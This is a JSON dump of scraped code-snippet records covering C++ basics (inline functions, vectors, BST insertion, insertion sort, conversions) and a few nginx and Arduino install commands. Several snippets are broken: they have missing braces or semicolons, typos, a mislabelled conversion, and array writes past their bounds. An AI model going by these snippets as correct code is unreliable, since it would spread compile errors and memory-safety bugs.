    "title": " initialzing a 2d vector in cpp",
    "description": "  // Create a vector containing n row and m columns   vector<vector<int> > vec( n , vector<int> (m, 0));  \n",
    "reg_date": "2021-10-12T11:41:34.000Z"
  },
  {
    "id": 2801,
    "keyword": null,
    "link": null,
    "title": " inline c++",
    "description": "#include<iostream> /* When a function will be called repetitively, The \"inline\" keyword is used for  optimization. The inline function tells the compiler that every instance of this function should be replaced with the line or block of code in the body of the function; This makes the compiler skip the middle-man, the function itself!  Important note: this method of optimization saves very little space, but it is still good practice.  ********************************************************************* * If this helped you, plz upvote!                                   * * My goal is to make programming easier to understand for everyone; *  * upvoting my content motivates me to post more!                    * *                                                                   * *********************************************************************   */ inline void PrintEverySecond(string str)  { std::cout << str;  int main() { string Message = \"Inline!\"  PrintEverySecond(Message);  }   // Unimportant note: this code obviously won't print every second since in isn't in a loop. This code is just a simple demo!\nA function specifier that indicates to the compiler that inline substitution  of the function body is to be preferred to the usual function call  implementation \n#include <iostream>   using namespace std;  inline int Max(int x, int y) {    return (x > y)? x : y; }  // Main function for the program int main() {    cout << \"Max (20,10): \" << Max(20,10) << endl;    cout << \"Max (0,200): \" << Max(0,200) << endl;    cout << \"Max (100,1010): \" << Max(100,1010) << endl;        return 0; }\nInline functions in C++\nInline Member Functions (C++) A member function that is both declared and defined in the class member list is called an inline member function. Member functions containing a few lines of code are usually declared inline. \n",
    "reg_date": "2021-10-12T11:41:34.000Z"
  },
  {
    "id": 2802,
    "keyword": null,
    "link": null,
    "title": " inline function in c++",
    "description": "A function specifier that indicates to the compiler that inline substitution  of the function body is to be preferred to the usual function call  implementation \n#include <iostream>   using namespace std;  inline int Max(int x, int y) {    return (x > y)? x : y; }  // Main function for the program int main() {    cout << \"Max (20,10): \" << Max(20,10) << endl;    cout << \"Max (0,200): \" << Max(0,200) << endl;    cout << \"Max (100,1010): \" << Max(100,1010) << endl;        return 0; }\nInline functions in C++\n#include <iostream> using namespace std; inline int cube(int s) {     return s*s*s; } int main() {     cout << \"The cube of 3 is: \" << cube(3) << \"\\n\";     return 0; } //Output: The cube of 3 is: 27 \nInline Member Functions (C++) A member function that is both declared and defined in the class member list is called an inline member function. Member functions containing a few lines of code are usually declared inline. \n",
    "reg_date": "2021-10-12T11:41:35.000Z"
  },
  {
    "id": 2803,
    "keyword": null,
    "link": null,
    "title": " inline in class in C++",
    "description": "#include <iostream>   using namespace std;  inline int Max(int x, int y) {    return (x > y)? x : y; }  // Main function for the program int main() {    cout << \"Max (20,10): \" << Max(20,10) << endl;    cout << \"Max (0,200): \" << Max(0,200) << endl;    cout << \"Max (100,1010): \" << Max(100,1010) << endl;        return 0; }\nInline Member Functions (C++) A member function that is both declared and defined in the class member list is called an inline member function. Member functions containing a few lines of code are usually declared inline. \n",
    "reg_date": "2021-10-12T11:41:35.000Z"
  },
  {
    "id": 2804,
    "keyword": null,
    "link": null,
    "title": " inline namespace",
    "description": "#include <iostream>  using namespace std;  namespace AppVersion{     namespace version1{         void display(){             cout <<\"display function from the version 1\"<<endl;         }     }     namespace version2{         void display(){             cout<< \"display function from the version 2\"<<endl;         }     }  inline   namespace version3{         void display(){             cout<< \"display function from the version 3\"<<endl;         }     }       namespace version3{         void whatsUp(){             cout<< \"whatsup function from the version 3\"<<endl;         }     }  }   int main() {     AppVersion :: display();     AppVersion :: whatsUp();     return 0; }   \n",
    "reg_date": "2021-10-12T11:41:35.000Z"
  },
  {
    "id": 2805,
    "keyword": null,
    "link": null,
    "title": " inorder traversal",
    "description": "void inorder(Node* root){     if(root != NULL){         inorder(root->left);         cout<<root->data<<\" \";         inorder(root->right);     } }\nvector<int> v; void inorder(TreeNode* root,vector<int> &v) {   if(root==NULL)     return;   inorder(root->left,v);   v.push_back(root->val);   inorder(root->right,v); }\nclass Solution {     public List<Integer> inorderTraversal(TreeNode root) {         List<Integer> list = new ArrayList<Integer>();         return dfs(root, list);     }     private List<Integer> dfs(TreeNode root, List<Integer> list)     {         if(root == null)             return list;         list = dfs(root.left, list);         list.add(root.val);         return dfs(root.right,list);     } }\n#include <iostream> using namespace std;  class node{ public:     int data;     node* left;     node* right;      node(int d){         data = d;         left = NULL;         right = NULL;     } };  node* buildTree(){     int d;     cin>>d;      if(d==-1){         return NULL;\t//to attach a NULL pointer[in case of no child] enter -1     }     node * root = new node(d);     root->left = buildTree();     root->right = buildTree();     return root; }    //REQUIRED FUNCTION: Inorder Traversal   void printIn(node*root){     if(root==NULL){         return;     }     //Otherwise Left Root Right     printIn(root->left);     cout<<root->data<<\" \";     printIn(root->right); }   int main(){      node* root = buildTree();     printIn(root);  \treturn 0; }  //SAMPLE INPUT TO RUN THE CODE ON ANY ONLINE IDE: //8 10 1 -1 -1 6 9 -1 -1 7 -1 -1 3 -1 14 13 -1 -1 -1 \n",
    "reg_date": "2021-10-12T11:41:35.000Z"
  },
  {
    "id": 2806,
    "keyword": null,
    "link": null,
    "title": " inpout in Array c++",
    "description": "cin >> sizeofarray; for (int i = 0; i < sizeofarray; ++i) {     cin >> a[i]; } \n",
    "reg_date": "2021-10-12T11:41:35.000Z"
  },
  {
    "id": 2807,
    "keyword": null,
    "link": null,
    "title": " input 2d vector c++",
    "description": "std::vector<vector<int>> d; //std::vector<int> d; cout<<\"Enter the N number of ship and port:\"<<endl; cin>>in; cout<<\"\\Enter preference etc..:\\n\"; for(i=0; i<in; i++){  cout<<\"ship\"<<i+1<<\":\"<<' ';     for(j=0; j<in; j++){     cin>>temp;     d[i].push_back(temp);      } }\nvector<vector<int> > d; int val; for(int i = 0; i < in; i++){     vector<int> temp;     for(int j = 0; j < in; j++){         cin >> val;         temp.push_back(val);     }     d.push_back(temp);     temp.clear(); } From SpyrosD3v25\nvector<vector<int> > d; int val; for(int i = 0; i < in; i++){     vector<int> temp;     for(int j = 0; j < in; j++){         cin >> val;         temp.push_back(val);     }     d.push_back(temp);     temp.clear(); } \nstd::vector<vector<int>> d; //std::vector<int> d; cout<<\"Enter the N number of ship and port:\"<<endl; cin>>in; cout<<\"\\Enter preference etc..:\\n\"; for(i=0; i<in; i++){  cout<<\"ship\"<<i+1<<\":\"<<' ';     for(j=0; j<in; j++){     cin>>temp;     d.push_back(temp);// I don't know how to push_back here!!     } }\n",
    "reg_date": "2021-10-12T11:41:35.000Z"
  },
  {
    "id": 2808,
    "keyword": null,
    "link": null,
    "title": " input a string in c++",
    "description": "string fullName; cout << \"Type your full name: \"; getline (cin, fullName); cout << \"Your name is: \" << fullName;\n",
    "reg_date": "2021-10-12T11:41:35.000Z"
  },
  {
    "id": 2809,
    "keyword": null,
    "link": null,
    "title": " input n space separated integers in c++",
    "description": "int main() { int sum = 0; cout << \"enter number\" << endl; int i = 0; while (true) {     cin >> i;     sum += i;     //cout << i << endl;     if (cin.peek() == '\\n') {         break;     }      }  cout << \"result: \" << sum << endl; return 0; } \n",
    "reg_date": "2021-10-12T11:41:35.000Z"
  },
  {
    "id": 2810,
    "keyword": null,
    "link": null,
    "title": " input output c++",
    "description": "// cin with strings #include <iostream> #include <string> using namespace std;  int main () {   string mystr;   cout << \"What's your name? \";   getline (cin, mystr);   cout << \"Hello \" << mystr << \".\\n\";   cout << \"What is your favorite team? \";   getline (cin, mystr);   cout << \"I like \" << mystr << \" too!\\n\";   return 0; }\n#include <iostream> int main() {   int year; //variable created as a integer   std::cin >> year;//It takes input from the user   std::cout << \"Year: \" << year; //It prints output on the screen }\n",
    "reg_date": "2021-10-12T11:41:35.000Z"
  },
  {
    "id": 2811,
    "keyword": null,
    "link": null,
    "title": " input pdf latex",
    "description": "\\includepdf[pages=-,pagecommand={},width=\\textwidth]{file.pdf} \n\\includepdf[pages=-,pagecommand={},width=\\textwidth]{file.pdf} or \\includepdf[pages=-,fitpaper]{file.pdf}\n",
    "reg_date": "2021-10-12T11:41:35.000Z"
  },
  {
    "id": 2812,
    "keyword": null,
    "link": null,
    "title": " input time from console C++",
    "description": "friend istream &operator>>( istream &input, Time &right ) //input in hh:mm format {         input >> right.hour; // input hours         input.ignore(); // skip :         input >>right.min; // input minute part         return input; }\n",
    "reg_date": "2021-10-12T11:41:35.000Z"
  },
  {
    "id": 2813,
    "keyword": null,
    "link": null,
    "title": " insert a value in pair in c++",
    "description": "#include<bits/stdc++.h> using  namespace std; int main(){   //Declaring   pair<string,int> p;      //Initializing   p.first = \"Empty String\";   p.second = 100;      //Output   cout<<p.first;   cout<<endl;   cout<<p.second;      return 0; }\n",
    "reg_date": "2021-10-12T11:41:36.000Z"
  },
  {
    "id": 2814,
    "keyword": null,
    "link": null,
    "title": " insert at position in vector c++",
    "description": "// where v is the vector to insert, i is // the position, and value is the value  v.insert(v.begin() + i, v2[i])\n",
    "reg_date": "2021-10-12T11:41:36.000Z"
  },
  {
    "id": 2815,
    "keyword": null,
    "link": null,
    "title": " insert binary search tree",
    "description": "struct Node {     int data;     Node *left, *right; };   // Function to create a new binary tree node having a given key Node* newNode(int key) {     Node* node = new Node;     node->data = key;     node->left = node->right = nullptr;       return node; }   // Function to perform inorder traversal on the tree void inorder(Node* root) {     if (root == nullptr) {         return;     }       inorder(root->left);     cout << root->data << \" \";     inorder(root->right); }   // Recursive function to insert a key into a BST Node* insert(Node* root, int key) {     // if the root is null, create a new node and return it     if (root == nullptr) {         return newNode(key);     }       // if the given key is less than the root node, recur for the left subtree     if (key < root->data) {         root->left = insert(root->left, key);     }     // if the given key is more than the root node, recur for the right subtree     else {         root->right = insert(root->right, key);     }       return root; }\npublic static Node insert(Node root, int x){     if (root == null)         return new Node(x);     else if(x>root.getData())         root.setRightChild(insert(root.getRightChild(),x));     else         root.setLeftChild(insert(root.getLeftChild(),x));     return root; } \nvoid BSNode::insert(std::string value) {  \tif (this->_data == value) { \t\t_count++; \t\treturn; \t}  \tif (this->_data > value) { \t\tif (this->getLeft() == nullptr) { \t\t\tthis->_left = new BSNode(value); \t\t} \t\tthis->getLeft()->insert(value); \t\treturn; \t}  \tif (this->getRight() == nullptr) { \t\tthis->_right = new BSNode(value); \t\treturn; \t} \tthis->getRight()->insert(value); }\n",
    "reg_date": "2021-10-12T11:41:36.000Z"
  },
  {
    "id": 2816,
    "keyword": null,
    "link": null,
    "title": " insert element in an array at specific position",
    "description": "var colors=[\"red\",\"blue\"];  var index=1;    //insert \"white\" at index 1  colors.splice(index, 0, \"white\");   //colors =  [\"red\", \"white\", \"blue\"]  \n/*  * Program  : Inserting an element in the array  * Language : C  */  #include<stdio.h>  #define size 5  int main() {     int arr[size] = {1, 20, 5, 78, 30};     int element, pos, i;      printf(\"Enter position and element\\n\");     scanf(\"%d%d\",&pos,&element);      if(pos <= size && pos >= 0)     {         //shift all the elements from the last index to pos by 1 position to right         for(i = size; i > pos; i--)             arr[i] = arr[i-1];          //insert element at the given position         arr[pos] = element;          /*          * print the new array          * the new array size will be size+1(actual size+new element)          * so, use i <= size in for loop          */         for(i = 0; i <= size; i++)             printf(\"%d \", arr[i]);     }     else         printf(\"Invalid Position\\n\");      return 0;   } \n",
    "reg_date": "2021-10-12T11:41:36.000Z"
  },
  {
    "id": 2817,
    "keyword": null,
    "link": null,
    "title": " insert element in array c++",
    "description": "#include <iostream>  using namespace std  int main() { \tint Array[] = {0}     for (int i = 1; i < 15; i++) {        \tcin >> Array[i];     };     return 0; }\nint main() {     int array[10];     for(int &i : array){         std::cin >> i;     } } \n",
    "reg_date": "2021-10-12T11:41:36.000Z"
  },
  {
    "id": 2818,
    "keyword": null,
    "link": null,
    "title": " insert elements in array in c++11",
    "description": "int main() {     int array[10];     for(int &i : array){         std::cin >> i;     } } \n",
    "reg_date": "2021-10-12T11:41:36.000Z"
  },
  {
    "id": 2819,
    "keyword": null,
    "link": null,
    "title": " insert image using set atribute",
    "description": "var img = document.getElementById(\"example\"); console.log(img.getAttribute(\"src\")); // \"images/foo.png\" console.log(img.src);                 // \"http://example.com/path/images/foo.png\" \n<img src=\"images/foo.png\"> \n",
    "reg_date": "2021-10-12T11:41:36.000Z"
  },
  {
    "id": 2820,
    "keyword": null,
    "link": null,
    "title": " insert into a vector more than once c++",
    "description": "std::vector<unsigned int> array;  // First argument is an iterator to the element BEFORE which you will insert: // In this case, you will insert before the end() iterator, which means appending value // at the end of the vector. array.insert(array.end(), { 1, 2, 3, 4, 5, 6 });\n",
    "reg_date": "2021-10-12T11:41:36.000Z"
  },
  {
    "id": 2821,
    "keyword": null,
    "link": null,
    "title": " insert only unique values into vector",
    "description": "std::vector<std::string> name;  .... if (std::find(name.begin(), name.end(), someName) == name.end()) {   // someName not in name, add it   name.push_back(someName); } \n",
    "reg_date": "2021-10-12T11:41:36.000Z"
  },
  {
    "id": 2822,
    "keyword": null,
    "link": null,
    "title": " insert vector to end of vector c++",
    "description": "vector<int> a; vector<int> b;  a.insert(a.end(), b.begin(), b.end()); // or a.insert(std::end(a), std::begin(b), std::end(b)); \n",
    "reg_date": "2021-10-12T11:41:36.000Z"
  },
  {
    "id": 2823,
    "keyword": null,
    "link": null,
    "title": " inserting at start in vector c++",
    "description": "// Inserting at start vector_name.insert(vector_name.begin(), element_to_be_inserted);  // Inserting after xth element vector_name.insert(vector_name.begin()+(x-1), element_to_be_inserted);  // Inserting at last vector_name.push_back(element_to_be_inserted);\n",
    "reg_date": "2021-10-12T11:41:36.000Z"
  },
  {
    "id": 2824,
    "keyword": null,
    "link": null,
    "title": " insertion and extraction operator overloading in c++",
    "description": "//<<<<<<<<<<<<<<<<<<<<<<<<<<<insertion operator overloading<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< Amir Ammar std::ostream& operator<<(std::ostream& out, const Bigint& i){   for(auto b = i.m_digits.begin(); b != i.m_digits.end(); ++b){     out<<(*b);   }   return (out); } //>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>extraction operator overloading>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Efi Fogel std::istream& operator>>(std::istream& in, Bigint& i) {   char c;   in.get(c);   if (c == '-') i.m_is_negative = true;   else {     if (! std::isdigit(c)) throw std::runtime_error(\"Invalid input\");     i.m_digits.emplace_front(c);   }   while (in.get(c) && (c != 0xa)) {     if (! std::isdigit(c)) throw std::runtime_error(\"Invalid input\");     i.m_digits.emplace_front(c);   }   i.m_digits.reverse(); // additional method to return the reversed value (the real input)   while(i.m_digits.front()=='0'&&i.m_digits.size()!= 1){ // while loop to earse additional zeroes      i.m_digits.pop_front();     if(i.m_digits.size()== 1)       break;   }   return in; }\n",
    "reg_date": "2021-10-12T11:41:37.000Z"
  },
  {
    "id": 2825,
    "keyword": null,
    "link": null,
    "title": " insertion overloading in c++",
    "description": "//<<<<<<<<<<<<<<<<<<<<<<<<<<<insertion operator overloading<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< Amir Ammar std::ostream& operator<<(std::ostream& out, const Bigint& i){   for(auto b = i.m_digits.begin(); b != i.m_digits.end(); ++b){     out<<(*b);   }   return (out); } \n",
    "reg_date": "2021-10-12T11:41:37.000Z"
  },
  {
    "id": 2826,
    "keyword": null,
    "link": null,
    "title": " insertion sort",
    "description": "#insertion sort def insert(arr):     for i in range(1,len(arr)):         while arr[i-1] > arr[i] and i > 0:             arr[i], arr[i-1] = arr[i-1], arr[i]             i -= 1      return arr  arr = [23, 55, 12, 99, 66, 33] print(insert(arr))\n//I Love Java import java.util.*; import java.io.*; import static java.util.stream.Collectors.toList; import java.util.stream.*;  public class Insertion_Sort_P {     public static void main(String[] args) throws IOException {         BufferedReader buffer = new BufferedReader(new InputStreamReader(System.in));          List<Integer> arr = Stream.of(buffer.readLine().replaceAll(\"\\\\s+$\", \" \").split(\" \")).map(Integer::parseInt)                 .collect(toList());          insertion_sort(arr);          System.out.println(arr);     }      public static void insertion_sort(List<Integer> arr) {         for (int i = 1; i <= arr.size() - 1; i++) {             steps(arr, i);         }     }      public static void steps(List<Integer> arr, int comp) {         for (int i = 0; i <= comp - 1; i++) {             if (arr.get(comp) < arr.get(i)) {                 swap(arr, i, comp);             }         }     }      static void swap(List<Integer> arr, int i, int j) {         int temp = arr.get(i);         arr.set(i, arr.get(j));         arr.set(j, temp);     } } \ndef insertionSort(arr):      for i in range(1, len(arr)):          key = arr[i]          j = i-1         while j >= 0 and key < arr[j] :                  arr[j + 1] = arr[j]                  j -= 1         arr[j + 1] = key \n#include <bits/stdc++.h>  using namespace std;   void insertionSort(int arr[], int n)   {       int i, temp, j;       for (i = 1; i < n; i++)      {           temp = arr[i];           j = i - 1;            while (j >= 0 && arr[j] > temp)          {               arr[j + 1] = arr[j];               j = j - 1;           }           arr[j + 1] = temp;       }   }  int main()   {       int arr[] = { 1,4,2,5,333,3,5,7777,4,4,3,22,1,4,3,666,4,6,8,999,4,3,5,32 };       int n = sizeof(arr) / sizeof(arr[0]);        insertionSort(arr, n);        for(int i = 0; i < n; i++){         cout << arr[i] << \" \";     }      return 0;   }  \n//insertion sort #include <iostream>  using namespace std; void insertion_sort(int arr[],int n) {     int value,index;     for(int i=1;i<n;i++)     {         value=arr[i];         index=i;         while(index>0&&arr[index-1]>value)         {             arr[index]=arr[index-1];             index--;          }         arr[index]=value;     } } void display(int arr[],int n) {     for(int i=0;i<n;i++)     {         cout<<arr[i]<<\" \";     }     cout<<endl; }  int main() {     int n;     cout<<\"enter the size of the array:\"<<endl;     cin>>n;     int array_of_numbers[n];     cout<<\"enter the elements of the array:\"<<endl;     for(int i=0;i<n;i++)     {         cin>>array_of_numbers[i];     }     cout<<\"array before sorting:\"<<endl;     display(array_of_numbers,n);     insertion_sort(array_of_numbers,n);     cout<<\"array after sorting is:\"<<endl;     display(array_of_numbers,n);      return 0; } \n// Por ter uma complexidade alta, // n&atilde;o &eacute; recomendado para um conjunto de dados muito grande. // Complexidade: O(n&sup2;) / O(n**2) / O(n^2) // @see https://www.youtube.com/watch?v=TZRWRjq2CAg // @see https://www.cs.usfca.edu/~galles/visualization/ComparisonSort.html  function insertionSort(vetor) {     let current;     for (let i = 1; i < vetor.length; i += 1) {         let j = i - 1;         current = vetor[i];         while (j >= 0 && current < vetor[j]) {             vetor[j + 1] = vetor[j];             j--;         }         vetor[j + 1] = current;     }     return vetor; }  insertionSort([1, 2, 5, 8, 3, 4])\nclass Sort   {      static void insertionSort(int arr[], int n)      {          if (n <= 1)                             //passes are done         {             return;          }          insertionSort( arr, n-1 );        //one element sorted, sort the remaining array                 int last = arr[n-1];                        //last element of the array         int j = n-2;                                //correct index of last element of the array                 while (j >= 0 && arr[j] > last)                 //find the correct index of the last element         {              arr[j+1] = arr[j];                          //shift section of sorted elements upwards by one element if correct index isn't found             j--;          }          arr[j+1] = last;                            //set the last element at its correct index     }       void display(int arr[])                 //display the array     {           for (int i=0; i<arr.length; ++i)          {             System.out.print(arr[i]+\" \");         }      }                public static void main(String[] args)      {          int arr[] = {22, 21, 11, 15, 16};                  insertionSort(arr, arr.length);          Sort ob = new Sort();         ob.display(arr);      }  }  \n function insertionSortRicorsivo(array A, int n)      if n>1         insertionSortRicorsivo(A,n-1)         value &larr; A[n-1]         j &larr; n-2         while j >= 0 and A[j] > value           do A[j + 1] &larr; A[j]             j &larr; j-1         A[j+1] &larr; value \n function insertionSortIterativo(array A)      for i &larr; 1 to length[A]         do value &larr; A[i]             j &larr; i-1         while j >= 0 and A[j] > value            do A[j + 1] &larr; A[j]              j &larr; j-1         A[j+1] &larr; value; \n",
    "reg_date": "2021-10-12T11:41:37.000Z"
  },
  {
    "id": 2827,
    "keyword": null,
    "link": null,
    "title": " insertion sort c++",
    "description": "Insertion program public class InsertionSortExample {    public void sort(int[] arrNum)    {       int number = arrNum.length;       for(int a = 1; a < number; ++a)       {          int keyValue = arrNum[a];          int b = a - 1;          while(b >= 0 && arrNum[b] > keyValue)          {             arrNum[b + 1] = arrNum[b];             b = b - 1;          }          arrNum[b + 1] = keyValue;       }    }    static void displayArray(int[] arrNum)    {       int num = arrNum.length;       for(int a = 0; a < num; ++a)       {          System.out.print(arrNum[a] + \" \");       }       System.out.println();    }    public static void main(String[] args)    {       int[] arrInput = { 50, 80, 10, 30, 90, 60 };       InsertionSortExample obj = new InsertionSortExample();       obj.sort(arrInput);       displayArray(arrInput);    } }\nvoid InsertionSort(int* A, int size) {    int i, key, j;       for (i = 1; i < N; i++)      {           key = A[i];           j = i - 1;              /* Move elements of arr[0..i-1], that are           greater than key, to one position ahead           of their current position */         while (j >= 0 && A[j] > key)          {               A[j + 1] = A[j];               j = j - 1;           }           A[j + 1] = key;       }    }\n// Por ter uma complexidade alta, // n&atilde;o &eacute; recomendado para um conjunto de dados muito grande. // Complexidade: O(n&sup2;) / O(n**2) / O(n^2) // @see https://www.youtube.com/watch?v=TZRWRjq2CAg // @see https://www.cs.usfca.edu/~galles/visualization/ComparisonSort.html  function insertionSort(vetor) {     let current;     for (let i = 1; i < vetor.length; i += 1) {         let j = i - 1;         current = vetor[i];         while (j >= 0 && current < vetor[j]) {             vetor[j + 1] = vetor[j];             j--;         }         vetor[j + 1] = current;     }     return vetor; }  insertionSort([1, 2, 5, 8, 3, 4])\n",
    "reg_date": "2021-10-12T11:41:37.000Z"
  },
  {
    "id": 2828,
    "keyword": null,
    "link": null,
    "title": " install arduino ide ubuntu",
    "description": "$ tar -xvf arduino-1.8.12-linux64.tar.xz \n$ cd arduino-1.8.12/ $ sudo ./install.sh  \n",
    "reg_date": "2021-10-12T11:41:37.000Z"
  },
  {
    "id": 2829,
    "keyword": null,
    "link": null,
    "title": " install c++ library windows",
    "description": "The .dll can go in any directory listed in your PATH environment variable.  The .lib file can go in any directory listed in your LIB environment variable.  The .h files can go in any directory listed in your INCLUDE environment variable.\n",
    "reg_date": "2021-10-12T11:41:37.000Z"
  },
  {
    "id": 2830,
    "keyword": null,
    "link": null,
    "title": " install nginx in ubuntu",
    "description": "sudo apt-get update sudo apt-get -y install nginx\nsudo systemctl start nginx\nsudo apt update sudo apt install nginx\nsudo apt update sudo apt install nginx \n",
    "reg_date": "2021-10-12T11:41:37.000Z"
  },
  {
    "id": 2831,
    "keyword": null,
    "link": null,
    "title": " install nginx on ubuntu 18.04",
    "description": "sudo apt update sudo apt install nginx\nsudo apt update sudo apt install nginx \n",
    "reg_date": "2021-10-12T11:41:37.000Z"
  },
  {
    "id": 2832,
    "keyword": null,
    "link": null,
    "title": " install nginx ubuntu 20.04",
    "description": "sudo apt update sudo apt install nginx\nsystemctl status nginx \nsudo apt update sudo apt install nginx \napt install -y nginx\n",
    "reg_date": "2021-10-12T11:41:37.000Z"
  },
  {
    "id": 2833,
    "keyword": null,
    "link": null,
    "title": " int a=0;     int b=30;",
    "description": "Which section would you like to enroll to? cpe11s1                   Slot Taken             Slot Available          StatusCPE11S1               15                       0                   FULLCPE11S2               4                        11                AVAILABLE\n",
    "reg_date": "2021-10-12T11:41:38.000Z"
  },
  {
    "id": 2834,
    "keyword": null,
    "link": null,
    "title": " int main() {",
    "description": "#include <iostream>  using namespace std;  int main ()  {    cout << \"Hello World\"; }\n",
    "reg_date": "2021-10-12T11:41:38.000Z"
  },
  {
    "id": 2835,
    "keyword": null,
    "link": null,
    "title": " int max in c++",
    "description": "#include <limits>  int imin = std::numeric_limits<int>::min(); // minimum value int imax = std::numeric_limits<int>::max(); // maximum value (2147483647)\n// largest int in c++ signed int iMax = (unsigned int)~0 >> 1; // largest unsigned int unsigned int uMax = (unsigned int)~0;\n// max example #include <iostream>     // std::cout #include <algorithm>    // std::max  int main () {   std::cout << \"max(1,2)==\" << std::max(1,2) << '\\n';   std::cout << \"max(2,1)==\" << std::max(2,1) << '\\n';   std::cout << \"max('a','z')==\" << std::max('a','z') << '\\n';   std::cout << \"max(3.14,2.73)==\" << std::max(3.14,2.73) << '\\n';   return 0; }\n2147483647   unsigned long long int = 18 446 744 073 709 551 615\n",
    "reg_date": "2021-10-12T11:41:38.000Z"
  },
  {
    "id": 2836,
    "keyword": null,
    "link": null,
    "title": " int random string generator c++",
    "description": "  string  gen_random(int len) {         string s;         static const char alphanum[] =             \"0123456789\"             \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"             \"abcdefghijklmnopqrstuvwxyz\";          for (int i = 0; i < len; ++i) {             s+= alphanum[rand() % (sizeof(alphanum) - 1)];              }       return s;     \n",
    "reg_date": "2021-10-12T11:41:38.000Z"
  },
  {
    "id": 2837,
    "keyword": null,
    "link": null,
    "title": " int to float c++",
    "description": "float a = 5.0; int b = static_cast<int>(a);\n    double v1 = 20120313.0;     float v2 = (float) v1;\nint a = 3; float b = (float)a;\n#include <iostream> #include <iomanip> using namespace std;  int main() { \tfloat x=10.3445f; \t \tcout<<fixed<<setprecision(5)<<x<<endl; \tcout<<fixed<<setprecision(2)<<x<<endl; \tcout<<fixed<<setprecision(3)<<x<<endl; \tcout<<fixed<<setprecision(0)<<x<<endl; \t \treturn 0; } \ndouble x; x = (double) 25;\n",
    "reg_date": "2021-10-12T11:41:38.000Z"
  },
  {
    "id": 2838,
    "keyword": null,
    "link": null,
    "title": " int to hexadecimal in c++",
    "description": "#include <sstream> std::stringstream sstream; sstream << std::hex << my_integer; std::string result = sstream.str();\n",
    "reg_date": "2021-10-12T11:41:38.000Z"
  },
  {
    "id": 2839,
    "keyword": null,
    "link": null,
    "title": " int to qstring",
    "description": "Use QString::number():  int i = 42; QString s = QString::number(i);\nint i = 42; QString s = QString::number(i);\n",
    "reg_date": "2021-10-12T11:41:38.000Z"
  },
  {
    "id": 2840,
    "keyword": null,
    "link": null,
    "title": " int to string c++",
    "description": "int result = Integer.parseInt(number);\n#include <string>   std::string s = std::to_string(42);\n#include <iostream> #include<string> using namespace std; int main() { int i = 11; float f = 12.3; string str = to_string(i); strinf fstr = to_string(f); }\n#include <string> using namespace std;  int iIntAsInt = 658; string sIntAsString = to_string(iIntAsInt);\n#include <string> // important  int main() {   int number = 1250;      std::string numberAsString = std::to_string(number);      // result \"1250\"      return 0; }\n#include<string> string s = to_string(int_val); \n",
    "reg_date": "2021-10-12T11:41:38.000Z"
  },
  {
    "id": 2841,
    "keyword": null,
    "link": null,
    "title": " intage1 was not declared in this scope C++",
    "description": "#include <iostream> using namespace std; int main () { \tintage1,intage2; \tintage1 = 18; \tintage2 = 15; \tint TotalAge; \tint AverageAge; \tcout << \"Please enter the sge of student 1:\"; \tcin >> age1; \tcout << \"Please enter the age of student 2:\"; \tcin >> age2; \tTotalage = age1 + age2; \tAverageAge = Totalage / 2; \tcout << \"The averageage of the class:\"; \t<< AverageAge; } \n",
    "reg_date": "2021-10-12T11:41:38.000Z"
  },
  {
    "id": 2842,
    "keyword": null,
    "link": null,
    "title": " integer to char c++",
    "description": "// for example you have such integer int i = 3;  // and you want to convert it to a char so that char c = '3';  what you need to do is, by adding i to '0'. The reason why it works is because '0' actually means an integer value of 48. '1'..'9' means 49..57. This is a simple addition to find out corresponding character for an single decimal digit integer:  i.e. char c = '0' + i;  If you know how to convert a single decimal digit int to char, whats left is how you can extract individual digit from a more-than-one-decimal-digit integer  it is simply a simple math by making use of / and %  int i = 123 % 10;  // give u last digit, which is 3 int j = 123 / 10;  // give remove the last digit, which is 12 The logic left is the homework you need to do then. \nstd::string s = std::to_string(number); char const *pchar = s.c_str();  //use char const* as target type\nchar aChar = '0' + i;\n",
    "reg_date": "2021-10-12T11:41:39.000Z"
  },
  {
    "id": 2843,
    "keyword": null,
    "link": null,
    "title": " integer to string c++",
    "description": "#include <string>   std::string s = std::to_string(42);\n#include <iostream> #include<string> using namespace std; int main() { int i = 11; float f = 12.3; string str = to_string(i); strinf fstr = to_string(f); }\n#include <string> using namespace std;  int iIntAsInt = 658; string sIntAsString = to_string(iIntAsInt);\nint x = 5; string str = to_string(x);\nstd::to_string(23213.123)\nstring str_val = to_string(int_val);\n",
    "reg_date": "2021-10-12T11:41:39.000Z"
  },
  {
    "id": 2844,
    "keyword": null,
    "link": null,
    "title": " integer type validation c++",
    "description": "cout << endl << \"Introduce an integer: \"; p = scanf(\"%d\", &x);       //Scanf returns a false when the value doesn't match the correct format. getchar();  while (p == false) {   cout << endl << \"You didn't introduce an integger. Try again.\";   \tcout << endl << \"Introduce an integer: \";      p = scanf(\"%d\", &x);   \tgetchar(); }\n",
    "reg_date": "2021-10-12T11:41:39.000Z"
  },
  {
    "id": 2845,
    "keyword": null,
    "link": null,
    "title": " interface in c++",
    "description": "#include <iostream> #include  <string> //Pure virtual function or inteface allows us to define a function in a base class that doesn't have an implementation or definition in the base class and force sub classes to implement that function //Pure virtual function is also called an interface in other languages class Entity { public: \t//virtual std::string GetName() { return \"Entity\"; }//This is a function that is just virtual .Overriding this function in sub class is optional we can instantiate subcllass without overriding  or implementing this function \t \t//Below is an example a Pure Virtual Function \t//It is an unimplemented function ant it forces the  sub class to implement it and define it \t//You will not be able to instantiate sub class without implementing or defining the function in sub class \tvirtual std::string GetName() = 0;    //the pure virtual function must have virtual written at the beginning and =0 at the end  //This function cannot contain any definition in base class,it is just a declaration }; class Player :public Entity { \tstd::string m_name;  public: \tPlayer(const std::string& name) \t\t:m_name(name) \t{}; \tvoid Print() { std::cout << \"This is Sub class\" << std::endl; }; \tstd::string GetName()override { return m_name; };//Pure virtual functions is implemented here in this sub class };  int main() { \t//Entity a;//We can't do this because class Entity contains function that is unimplemented \tPlayer x(\"Jacob\");//This will work because we have implemented or defined the function in this sub class \tstd::cin.get(); }\nclass IDemo {     public:         virtual ~IDemo() {}         virtual void OverrideMe() = 0; };  class Child : public IDemo {     public:         virtual void OverrideMe()         {             //do stuff         } }; \nclass IDemo {     public:         virtual ~IDemo() {}         virtual void OverrideMe() = 0; };  class Parent {     public:         virtual ~Parent(); };  class Child : public Parent, public IDemo {     public:         virtual void OverrideMe()         {             //do stuff         } }; \n",
    "reg_date": "2021-10-12T11:41:39.000Z"
